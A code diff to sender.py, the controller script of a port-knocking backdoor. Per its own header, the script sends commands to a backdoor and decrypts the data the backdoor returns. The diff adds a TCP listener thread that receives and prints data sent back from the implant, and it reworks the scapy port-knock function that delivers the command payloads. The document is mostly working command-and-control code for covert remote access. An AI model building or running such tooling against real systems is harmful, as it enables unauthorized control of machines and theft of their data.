@@ -13,7 +13,7 @@ sender.py
       then decrypts the data returned from backdoor and display to user.
 ----------------------------------------------------------------------------------------------------
 """
-
+import socket as sock
 from _thread import *
 from scapy.all import *
 from scapy.layers.inet import *
@@ -78,9 +78,13 @@ def start_sender():
     port1 = config['receiver_port1']
     port2 = config['receiver_port2']
     port3 = config['receiver_port3']
-    sender_addr = config['sender_address']
+    # sender_addr = config['sender_address']
     sender_port = config['sender_port']
     port_knock_auth = config['port_knock_auth']
+
+    hostname = socket.gethostname()
+    IPAddr = socket.gethostbyname(hostname)
+    start_new_thread(data_server, (IPAddr, sender_port))
 
     keep_going = True
     while keep_going:
@@ -95,12 +99,10 @@ def start_sender():
             print("Invalid character detected. Must be UTF-8 supported values only.")
             continue
 
-        send_port_knock_command(user_input, receiver_addr, port1, port2, port3, sender_addr, sender_port,
-                                port_knock_auth)
+        send_port_knock_command(user_input, receiver_addr, port1, port2, port3, port_knock_auth)
 
 
-def send_port_knock_command(message, receiver_addr, port1, port2, port3, sender_addr, sender_port,
-                            port_knock_auth):
+def send_port_knock_command(message, receiver_addr, port1, port2, port3, port_knock_auth):
 
     sport = RandShort()
     command_payload = port_knock_auth + "|" + message
@@ -112,6 +114,25 @@ def send_port_knock_command(message, receiver_addr, port1, port2, port3, sender_
     send(port_knock_1, verbose=0)
     send(port_knock_2, verbose=0)
     send(port_knock_3, verbose=0)
+
+
+def data_server(address, port):
+    with sock.socket(sock.AF_INET, sock.SOCK_STREAM) as IPv4_sock:
+        IPv4_sock.setsockopt(sock.SOL_SOCKET, sock.SO_REUSEADDR, 1)
+        IPv4_sock.bind((address, port))
+        IPv4_sock.listen(10)
+        print("Listening on: ", IPv4_sock.getsockname())
+
+        while True:
+            conn, addr = IPv4_sock.accept()
+
+            while True:
+                data = conn.recv(1024).decode('utf8')
+                if data:
+                    print(f"{conn.getpeername()}: \t{data}")
+                else:
+                    conn.close()
+                    break
 
 
 def send_message(message, receiver_addr, port):
@@ -186,8 +207,6 @@ def send_message(message, receiver_addr, port):
 
 if __name__ == "__main__":
     try:
-        hostname = socket.gethostname()
-        IPAddr = socket.gethostbyname(hostname)
         start_sender()
     except KeyboardInterrupt as e:
         print("Sender Shutdown")
